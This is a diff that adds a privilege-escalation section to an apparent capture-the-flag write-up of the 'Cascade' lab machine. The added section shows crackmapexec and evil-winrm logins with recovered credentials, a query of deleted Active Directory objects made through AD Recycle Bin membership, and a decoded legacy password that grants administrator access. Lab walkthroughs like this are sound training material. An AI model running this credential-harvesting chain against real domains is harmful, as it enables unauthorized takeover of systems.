@@ -431,7 +431,52 @@ I can also create a python [script](https://github.com/timmccann222/Public-Write
 
 New set of credentials: `ArkSvc:w3lc0meFr31nd`
 
+## Privilege Escalation - AD Recycle Bin (Group)
 
+Confirmed that user can signin via WinRM:
+
+```bash
+crackmapexec winrm 10.10.10.182 -u arksvc -p "w3lc0meFr31nd"
+
+SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
+HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
+WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd (Pwn3d!)
+```
+
+Signed in with `evil-winrm`:
+
+```bash
+evil-winrm -i 10.10.10.182 -u arksvc -p "w3lc0meFr31nd"
+```
+
+Checking details about the user shows that they belong to a group titled `AD Recycle Bin`. Membership in this group allows for the reading of deleted Active Directory objects, which can [reveal sensitive information](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges):
+
+```bash
+*Evil-WinRM* PS C:\Users\arksvc> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
+
+.......
+CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
+                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+CN                              : TempAdmin
+.......
+```
+
+I found a deleted object titled `TempAdmin` with a base64 encoded password `YmFDVDNyMWFOMDBkbGVz`. Can decode this password and using it with the administrator account appears to work:
+
+```bash
+evil-winrm -i 10.10.10.182 -u administrator -p "baCT3r1aN00dles"
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        6/15/2024   1:04 PM             34 root.txt
+```
 
 
 
